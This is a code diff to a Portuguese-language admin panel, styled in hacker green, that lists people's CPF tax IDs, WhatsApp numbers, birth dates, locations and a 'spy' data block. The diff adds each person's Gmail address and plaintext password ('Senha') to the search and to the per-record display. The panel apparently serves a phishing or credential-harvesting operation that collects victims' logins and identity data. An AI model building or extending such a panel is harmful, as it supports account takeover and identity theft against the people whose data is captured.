@@ -99,7 +99,6 @@
     .btn-del-all { border-color: #ff3b3b; color: #ff3b3b; }
     .btn-del-all:hover { background: #ff3b3b; color: #000; box-shadow: 0 0 15px #ff3b3b; }
 
-    /* ===== ÁREA DE BAIXO - MENOR ===== */
     .busca {
       width: 100%; padding: 7px 10px; background: #050505;
       border: 1px solid #00ff41; border-radius: 4px;
@@ -381,6 +380,7 @@
         return (d.nome || '').toLowerCase().indexOf(termo) !== -1 ||
           (d.whatsapp || '').toLowerCase().indexOf(termo) !== -1 ||
           (d.cpf || '').toLowerCase().indexOf(termo) !== -1 ||
+          (d.gmail || '').toLowerCase().indexOf(termo) !== -1 ||
           (d.mensagem || '').toLowerCase().indexOf(termo) !== -1 ||
           (d.localizacao && d.localizacao.cidade || '').toLowerCase().indexOf(termo) !== -1 ||
           (d.origem || '').toLowerCase().indexOf(termo) !== -1;
@@ -547,6 +547,7 @@
           blocoEspiaoFinal = blocoEspiao;
         }
 
+        // DADOS DO LOGIN com Gmail e Senha
         html +=
           '<div class="cadastro">' +
             '<div class="cadastro-header">' +
@@ -559,6 +560,8 @@
               '<div class="campo"><div class="rotulo">CPF</div><div class="valor">' + esc(d.cpf) + '</div></div>' +
               '<div class="campo"><div class="rotulo">WhatsApp</div><div class="valor">' + esc(d.whatsapp) + '</div></div>' +
               '<div class="campo"><div class="rotulo">Nascimento</div><div class="valor">' + formatarData(d.dataNascimento) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Gmail</div><div class="valor">📧 ' + esc(d.gmail) + '</div></div>' +
+              '<div class="campo"><div class="rotulo">Senha</div><div class="valor">🔑 ' + esc(d.senha) + '</div></div>' +
             '</div>' +
             blocoMensagem +
             blocoDados +
